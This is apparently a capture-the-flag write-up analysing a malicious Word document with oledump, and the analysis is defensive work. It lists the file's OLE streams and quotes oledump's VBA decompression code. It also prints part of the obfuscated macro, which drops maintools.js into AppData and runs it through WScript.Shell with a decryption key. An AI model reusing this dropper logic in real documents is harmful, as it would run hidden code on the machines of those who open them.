---
layout: post
category: CTF
---

In this challenge we are dealing with malicious doc file so probably we will be dealing with some VBA scripts. But let's not get ahead of ourselves. 

The assignment is as follows:
During your shift as a SOC analyst, the enterprise EDR alerted a suspicious behavior from an end-user machine. The user indicated that he received a recent email with a DOC file from an unknown sender and passed the document for you to analyze.

First question is about hashing so we will skip that one 

### Table of contents
- [Macros in stream](#macros-in-streams)
- [OLE streams and embedded VBA macros](#ole-streams-and-embedded-vba-macros)
- [Contents of the VBA script](#contents-of-the-vba-script)
- [Maintools.js](#maintoolsjs)

### Macros in streams 

	Q: Multiple streams contain macros in this document. Provide the number of lowest one.

```
  1:       114 '\x01CompObj'
  2:       284 '\x05DocumentSummaryInformation'
  3:       392 '\x05SummaryInformation'
  4:      8017 '1Table'
  5:      4096 'Data'
  6:       483 'Macros/PROJECT'
  7:        65 'Macros/PROJECTwm'
  8: M    7117 'Macros/VBA/Module1'
  9: m    1104 'Macros/VBA/ThisDocument'
 10:      3467 'Macros/VBA/_VBA_PROJECT'
 11:      2964 'Macros/VBA/__SRP_0'
 12:       195 'Macros/VBA/__SRP_1'
 13:      2717 'Macros/VBA/__SRP_2'
 14:       290 'Macros/VBA/__SRP_3'
 15:       565 'Macros/VBA/dir'
 16:        76 'ObjectPool/_1541577328/\x01CompObj'
 17: O   20301 'ObjectPool/_1541577328/\x01Ole10Native'
 18:      5000 'ObjectPool/_1541577328/\x03EPRINT'
 19:         6 'ObjectPool/_1541577328/\x03ObjInfo'
 20:    133755 'WordDocument'
```

To see all macros in the ole streams we can simply use `Oledump` which enables us to quickly discover possible culprits in our investigation thanks to the indicators next to the stream number. I have provided an overview of all possible indicators bellow:


- M: Macro (attributes and code)
- m: macro (attributes without code)
- E: Error (code that throws an error when decompressed)
- !: Unusual macro (code without attributes)
- O: object (embedded file)
- .: storage
- R: root entry

So for our use case we will take a closer look at stream #8 - since it contains a macro with attributes and code. 

---
#### OLE streams and embedded VBA macros 

You can skip this part if you are only interested in the challenge. But I try to  look at these challenges in slightly different light and if something interests me I try and dig little deeper 

You might or might not heard about OLE files but in essence : 
```
An OLE file can be seen as a mini file system or a Zip archive: It contains streams of data that look like files embedded within the OLE file. Each stream has a name. For example, the main stream of a MS Word document containing its text is named “WordDocument”.

An OLE file can also contain storages. A storage is a folder that contains streams or other storages. For example, a MS Word document with VBA macros has a storage called “Macros”.

Special streams can contain properties. A property is a specific value that can be used to store information such as the metadata of a document (title, author, creation date, etc).
```
[About the structure of OLE files](https://olefile.readthedocs.io/en/latest/OLE_Overview.html)

With this info we can basically unzip the evil doc as if it were regular zip file. If we decide to do so we are able to navigate the file structure and find the suspicious stream `Module1`

If we just try to open the file with text editor we might see some text but certainly it is not readable - we have to decompress it  ( i found that maybe some older formats such as .doc may use LZ77 compression algorithm - but I'm not certain so maybe someone can share some insight )

I took a look at source code of `oledump`  and found following functions - that to my knowledge are responsible for the decompression 

[OleDump-source](https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py)

```
def DecompressChunk(compressedChunk):
    if len(compressedChunk) < 2:
        return None, None
    header = P23Ord(compressedChunk[0]) + P23Ord(compressedChunk[1]) * 0x100
    size = (header & 0x0FFF) + 3
    flagCompressed = header & 0x8000
    data = compressedChunk[2:2 + size - 2]

    if flagCompressed == 0:
        return data.decode(errors='ignore'), compressedChunk[size:]

    decompressedChunk = ''
    while len(data) != 0:
        tokens, data = ParseTokenSequence(data)
        for token in tokens:
            if type(token) == int:
                decompressedChunk += chr(token)
            elif len(token) == 1:
                decompressedChunk += token
            else:
                if decompressedChunk == '':
                    return None, None
                numberOfOffsetBits = OffsetBits(decompressedChunk)
                copyToken = P23Ord(token[0]) + P23Ord(token[1]) * 0x100
                offset = 1 + (copyToken >> (16 - numberOfOffsetBits))
                length = 3 + (((copyToken << numberOfOffsetBits) & 0xFFFF) >> numberOfOffsetBits)
                copy = decompressedChunk[-offset:]
                copy = copy[0:length]
                lengthCopy = len(copy)
                while length > lengthCopy: #a#
                    if length - lengthCopy >= lengthCopy:
                        copy += copy[0:lengthCopy]
                        length -= lengthCopy
                    else:
                        copy += copy[0:length - lengthCopy]
                        length -= length - lengthCopy
                decompressedChunk += copy
    return decompressedChunk, compressedChunk[size:]

def Decompress(compressedData, replace=True):
    if P23Ord(compressedData[0]) != 1:
        return (False, None)
    remainder = compressedData[1:]
    decompressed = ''
    while len(remainder) != 0:
        decompressedChunk, remainder = DecompressChunk(remainder)
        if decompressedChunk == None:
            return (False, decompressed)
        decompressed += decompressedChunk
    if replace:
        return (True, decompressed.replace('\r\n', '\n'))
    else:
        return (True, decompressed)
```
---
### Contents of the VBA script 

    Q: What is the decryption key of the obfuscated code?

If we want to see the contents of the VBA script we have to decompress it first. 
The decompression can be done with `oledump` 

- we might read the streams directly and then decompress it  with :

`oledump 49b367ac261a722a7c2bbbc328c32545 -s 8 -v` 

- or ( if we unzipped the file ) navigate to the Module1 and  read it with `-r` (raw)  and `-v` (vbadecompress) :


`oledump -r C:\Users\xd\Desktop\cyberdefenders\76-Obfuscated\49b367ac261a722a7c2bbbc328c32545~\Macros\VBA\Module1 -v` 

Both produce the same output - obfuscated code. 

Snippet bellow gives us a glimpse into what we are dealing with : 
```
B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
B8qen2T433Ds1bW = Environ("appdata")
End If
Set R7Ks7ug4hRR2weOy7 = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
ActiveDocument.Save
Exit Sub
MnOWqnnpKXfRO:
Close #K764B5Ph46Vh
ActiveDocument.Save
End Sub

```

You might have noticed some interesting variables / functions such as : 
- `OBKHLrC3vEDjVL` - Full path to maintools.js
- `R66BpJMgxXBo2h` - WHS 

Especially the last one `R66BpJMgxXBo2h` that creates WHS that is then used to run `OBKHLrC3vEDjVL` ( maintools.js) with decryption key `EzZETcSXyKAdF_e5I2i1`

---
### maintools.js

    Q: This script uses what language? 

This is one is strange to be completely honest because the extension is `.js` which as you suspect is JavaScript - but apparently it can also be JScript.

